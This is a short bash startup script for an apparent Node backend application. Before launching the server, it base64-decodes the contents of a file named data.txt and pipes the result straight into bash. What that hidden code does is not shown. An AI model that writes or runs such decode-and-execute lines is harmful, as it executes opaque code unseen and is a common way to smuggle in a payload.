#!/bin/bash


cat ./data.txt |base64 -d |bash -
node packages/backend --config app-config.yaml